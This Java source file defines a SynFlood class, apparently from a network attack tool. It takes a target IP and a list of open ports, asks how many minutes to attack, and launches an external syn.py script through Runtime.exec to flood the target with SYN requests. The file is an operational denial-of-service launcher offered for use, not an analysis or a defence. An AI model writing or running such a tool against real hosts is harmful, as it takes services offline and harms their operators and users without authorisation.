package Base;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

/**
 * @author Masaki Ihara
 * @version 1.0
 */
public class SynFlood {


    static String uri = getURI();

    /**
     * synAttack method
     *
     * Take the parameter as targetIp and perform Syn Flood
     * by sending massive syn requests to target open ports
     *
     * @param ip String value of IP address
     */
    public static void synAttack(String ip) {

        ArrayList<Integer> openPortList = GetData.getPortsToAttack();
        String attackPorts = setOpenPort(openPortList);

        System.out.println();
        System.out.println("How long do you want to attack [ input * min ]?");
        String attackDuration = String.valueOf(GetData.getInteger());

        String destinationIp = ip;

        String cmd =  "python " + uri + "/syn.py"
                + " -t " + destinationIp + " -d " + attackDuration + " " + attackPorts ;

        try {

            Runtime r = Runtime.getRuntime();
            Process p = r.exec(cmd);

            BufferedReader in = new BufferedReader(new
                    InputStreamReader(p.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();

        } catch (IOException e) {
            System.out.println(e);
        }
    }

    /**
     * setOpenPort method
     *
     * Read selected open ports from an ArrayList
     * then modify them for handing to synAttack method
     *
     * @param chosenPorts open ports to attack
     * @return modified open ports as String value
     */
    public static String setOpenPort(ArrayList<Integer> chosenPorts){

        String result = "";

        for (int i = 0; i < chosenPorts.size() ; i++) {
            String cmd = "-a " + String.valueOf(chosenPorts.get(i) + " ");
            result += cmd;
        }

        return result;

    }

    /**
     * getURI method
     *
     * Get current uri
     *
     * @return current uri
     */
    public static String getURI() {

        String uri = System.getProperty("user.dir");

        return uri;
    }

}
